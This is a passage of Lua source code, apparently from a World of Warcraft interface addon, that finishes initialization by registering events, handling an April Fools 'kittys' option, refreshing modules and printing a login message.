	self:RegisterEvent('UPDATE_FLOATING_CHAT_WINDOWS', 'UIScale');
	self:RegisterEvent('PLAYER_ENTERING_WORLD');
	
	if self.db.general.kittys then
		self:CreateKittys()
		if (E:IsFoolsDay() and self:CheckForFoolsDayFuckup()) then
			E:AprillFoolsFuckupFix()
		else
			self:Delay(5, self.Print, self, L["Type /aprilfools to revert to old settings."])
		end
	end
	
	self:Tutorials()
	self:GetModule('Minimap'):UpdateSettings()
	self:RefreshModulesDB()
	collectgarbage("collect");
	
	if self.db.general.loginmessage then
		print(select(2, E:GetModule('Chat'):FindURL("CHAT_MSG_DUMMY", format(L['LOGIN_MSG'], self["media"].hexvaluecolor, self["media"].hexvaluecolor, self.version)))..'.')
	end
end